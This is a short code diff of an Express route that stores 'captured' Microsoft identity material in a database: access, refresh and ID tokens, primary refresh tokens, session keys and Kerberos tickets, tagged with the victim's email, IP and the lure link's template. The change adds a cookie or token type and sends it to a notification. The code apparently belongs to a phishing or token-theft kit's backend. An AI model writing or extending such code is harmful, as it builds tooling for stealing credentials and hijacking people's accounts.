@@ -346,16 +346,20 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
+    // Determine token_type based on link auth_mode
+    const tokenType = link.auth_mode === 'cookie' ? 'cookie' : 'token';
+
     const [result] = await db.query(
         `INSERT INTO captured_tokens
         (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted,
          prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey,
          account_type, ip_address, user_agent, expiration, tenant, template_type, client_id)
-        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
         [
             user_id,
             link_id,
             email,
+            tokenType,
             encrypt(access_token),
             encrypt(refresh_token || null),
             encrypt(id_token || null),
@@ -442,6 +446,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     const captureData = {
         email,
         templateType: link.template_type,
+        tokenType: tokenType, // Add tokenType for notification
         accessToken: access_token,
         refreshToken: prt,
         idToken: id_token,
